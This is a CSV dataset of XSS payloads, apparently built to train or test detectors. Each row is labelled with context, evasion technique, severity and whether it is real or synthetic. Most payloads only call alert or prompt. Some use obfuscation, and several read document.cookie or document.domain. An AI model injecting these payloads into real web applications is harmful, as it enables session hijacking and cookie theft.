payload,context,technique,severity,length,source
<label id=x tabindex=1 onfocus=alert(1)></label>,event_handler,none,medium,48,real
<map onpointerenter=alert(1) style=display:block>AnonKryptiQuz</map>,event_handler,none,medium,68,real
"<u onmouseover=""alert(1)"">AnonKryptiQuz</u>",event_handler,none,medium,43,real
<audio controls src=1 onfocusin=alert(1) autofocus>,event_handler,none,medium,51,real
"<abbr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></abbr>",event_handler,none,medium,84,real
<svg><progress onload=alert(1)></progress>,event_handler,none,medium,42,real
"<ol oncontextmenu=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,47,real
<svG oNerRor=coNfiRm(DocUmeNt.CooKie)>,tag_injection,synthetic,medium,38,synthetic
%3Csvg onmouseenter=prompt('XSS')%3E,tag_injection,synthetic,medium,36,synthetic
"<cite oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,71,real
"<multicol onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,91,real
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",event_handler,none,medium,126,real
"<a href=""\x04javascript:javascript:alert(3228)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
<svg onfocus=alert(1)>,tag_injection,synthetic,medium,22,synthetic
<rb onpointerdown=alert(1) style=display:block>AnonKryptiQuz</rb>,event_handler,none,medium,65,real
"<noembed ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,95,real
""" oNerRor=coNsoLe.Log(1) """,attribute_escape,synthetic,medium,26,synthetic
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,96,real
"<menuitem onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,75,real
<SCRIPT> alert(“XSS”); </SCRIPT>,script_injection,case_variation,medium,32,real
<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>,event_handler,none,medium,62,real
"<br onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</br>",event_handler,none,medium,61,real
%3Cscript%3E/*/alert(document.domain)%3C/script%3E,script_injection,synthetic,medium,50,synthetic
<svg onerror=prompt(1)/>,tag_injection,synthetic,medium,24,synthetic
<th id=x tabindex=1 onfocusin=alert(1)></th>,event_handler,none,medium,44,real
"<strike onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</strike>",event_handler,none,medium,68,real
"<section onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,73,real
<script>javascript:alert(9177)</script>,script_injection,none,medium,39,real
"""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",js_uri,none,medium,50,real
<script>//&#97;l&#101;rt(docum&#101;nt.cooki&#101;)</script>,script_injection,synthetic,medium,60,synthetic
"<data onmousemove=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,49,real
<button popovertarget=x>Click me</button><slot onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</slot>,event_handler,none,medium,104,real
"<img onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,71,synthetic
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationend=""alert(1)""></bgsound>",event_handler,none,medium,99,real
<em onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</em>,event_handler,none,medium,70,real
%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--,event_handler,url_encoding,low,149,real
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",event_handler,none,medium,138,real
"<frame onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</frame>",event_handler,none,medium,66,real
"<td onmouseenter=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,46,real
"<img onclick=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,43,real
"<time onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,67,real
"<option draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,70,real
"document.write(""<img src=x onerror=console.log(document.domain)>"")",dom_sink,synthetic,medium,66,synthetic
' onfocus=confirm(location.hash) ',attribute_escape,synthetic,medium,34,synthetic
"<em draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,82,real
<marquee onstart=alert(1)>,event_handler,none,medium,26,real
<button popovertarget=x>Click me</button><ul onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ul>,event_handler,none,medium,100,real
"<figcaption draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,98,real
' oNmoUseOveR=aLerT('XSS') ',attribute_escape,synthetic,medium,28,synthetic
<button popovertarget=x>Click me</button><applet ontoggle=alert(1) popover id=x>AnonKryptiQuz</applet>,event_handler,none,medium,102,real
"<sub draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,83,real
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;9421&#41;&#47;&#47;"">XYZ</a",event_handler,html_entity,low,88,real
""" onbegin=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
%3Csvg onmouseenter=console.log('XSS')/%3E,tag_injection,synthetic,medium,42,synthetic
&amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;,event_handler,none,medium,58,real
<td id=x tabindex=1 onactivate=alert(1)></td>,event_handler,none,medium,45,real
<code onpointerout=alert(1) style=display:block>AnonKryptiQuz</code>,event_handler,none,medium,68,real
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></hr>",event_handler,none,medium,104,real
<button popovertarget=x>Click me</button><strong onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</strong>,event_handler,none,medium,108,real
"SetTimEouT(""ConFirM(1)"",0)",dom_sink,synthetic,medium,26,synthetic
"<input draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,68,real
' onmous&#101;ov&#101;r=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,59,synthetic
"&#101;v&#97;l(""prompt(1)"")",dom_sink,synthetic,medium,26,synthetic
"<frameset onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",event_handler,none,medium,77,real
"<slot onclick=""alert(1)"">AnonKryptiQuz</slot>",event_handler,none,medium,45,real
"<figcaption onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",event_handler,none,medium,78,real
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,script_injection,none,medium,196,real
"<Svg/OnLoad=alert(1337)>""@gmail.com",event_handler,case_variation,medium,35,real
<slot onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</slot>,event_handler,none,medium,74,real
"<section oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",event_handler,none,medium,95,real
<svG oNloAd=ProMpt(1)/>,tag_injection,synthetic,medium,23,synthetic
"<figcaption draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</figcaption>",event_handler,none,medium,76,real
"<basefont onmousemove=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,57,real
"<AnonKryptiQuz STYLE=""Xss:expressionfalert('AnonKryptiQuz'))"">",attribute_escape,case_variation,medium,62,real
<link onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,66,real
"<body onPageShow body onPageShow=""javascript:javascript:alert(5797)""></body onPageShow>",event_handler,none,medium,87,real
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,59,real
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",event_handler,none,medium,166,real
"<select draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</select>",event_handler,none,medium,89,real
<svg ontoggle=console.log(document.domain)/>,tag_injection,synthetic,medium,44,synthetic
<cite onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</cite><input value=clickme>,event_handler,none,medium,99,real
%3Csvg onbegin=console.log(location.hash)/%3E,tag_injection,synthetic,medium,45,synthetic
"<frame onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,71,real
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",js_uri,case_variation,medium,58,real
"%0d%0a%20""><svg onload=alert(1)>",event_handler,url_encoding,medium,32,real
<applet onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</applet><input value=clickme>,event_handler,none,medium,112,real
"<input2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></input2>",event_handler,none,medium,285,real
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",event_handler,none,medium,130,real
<sub onpointerout=alert(1) style=display:block>AnonKryptiQuz</sub>,event_handler,none,medium,66,real
"<sub draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,64,real
"<img \x47src=x onerror=""javascript:alert(6642)"">",event_handler,none,medium,48,real
<!--[if gte IE 4]><SCRIPT>javascript:alert(8303);</SCRIPT><![endif]-->,script_injection,comment_injection|case_variation,medium,70,real
"""><Svg onErrOr=AleRt('XSS')>",tag_injection,synthetic,medium,28,synthetic
"<hgroup onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></hgroup>",event_handler,none,medium,285,real
<body onmessage=print()>,event_handler,none,low,24,real
"<input type=""text"" value=""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""></input>",event_handler,comment_injection|url_encoding,medium,180,real
<frameset onpointermove=alert(1) style=display:block>AnonKryptiQuz</frameset>,event_handler,none,medium,77,real
' oNbeGin=coNfiRm(DocUmeNt.CooKie) ',attribute_escape,synthetic,medium,36,synthetic
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",js_uri,none,medium,98,real
"<style>@keyframes slidein {}</style><dd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></dd>",event_handler,none,medium,164,real
"<template onmousemove=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,57,real
"<data draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,86,real
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tfoot>",event_handler,none,medium,110,real
' onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,55,synthetic
"<head ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,89,real
"<input onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</input>",event_handler,none,medium,65,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><animatemotion id=x style=""position:absolute;"" onanimationcancel=""print()""></animatemotion>",event_handler,none,low,195,real
<nav onpointerenter=alert(1) style=display:block>AnonKryptiQuz</nav>,event_handler,none,medium,68,real
%22><svg ontoggle=prompt(1)>,tag_injection,synthetic,medium,28,synthetic
%3Csvg onfocus=confirm(document.domain)/%3E,tag_injection,synthetic,medium,43,synthetic
"""><svg onload=alert&amp;#x27;#x00000040""1"")>",event_handler,none,low,44,real
<img onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<abbr draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</abbr>",event_handler,none,medium,66,real
<pre onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<param onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</param>",event_handler,none,medium,63,real
<form id=x tabindex=1 onfocus=alert(1)></form>,event_handler,none,medium,46,real
"<animate oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
<svg><script ?>alert(1),script_injection,none,medium,23,real
<svg onlo&#97;d=confirm(1)>,tag_injection,synthetic,medium,27,synthetic
<svg ontoggle=\u0061lert(document.cookie)>,tag_injection,synthetic,medium,42,synthetic
"<tt draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,62,real
"s&#101;tTim&#101;out(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink,synthetic,medium,73,synthetic
"<html onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,63,real
"""><Img onLoaD=pRomPt(1)>",tag_injection,synthetic,medium,24,synthetic
%22><svg onclick=console.log(document.domain)>,tag_injection,synthetic,medium,46,synthetic
<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>,event_handler,none,medium,76,real
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></blink>",event_handler,none,medium,103,real
"<ol oncut=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",event_handler,none,medium,55,real
"<aside draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</aside>",event_handler,none,medium,88,real
%22><svg onload=prompt(1)>,tag_injection,synthetic,medium,26,synthetic
"%22><svg onclick=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"<a2 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,61,real
"<a onmousemove=""alert(1)"">AnonKryptiQuz</a>",event_handler,none,medium,43,real
"<script onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,73,real
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,58,real
<svG oNmoUseEntEr=AleRt(DocUmeNt.CooKie)>,tag_injection,synthetic,medium,41,synthetic
<body onbeforeprint=alert(1)>,event_handler,none,medium,29,real
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",event_handler,none,medium,110,real
<img src=javascript:alert(&quot;AnonKryptiQuz&quot;)>,js_uri,none,medium,53,real
"<s onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></s>",event_handler,none,medium,275,real
"%22 onload=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,57,synthetic
"<dt oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,67,real
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(8195)&amp;gt;>"">",event_handler,none,medium,119,real
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",event_handler,none,medium,134,real
"<blockquote onclick=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,77,real
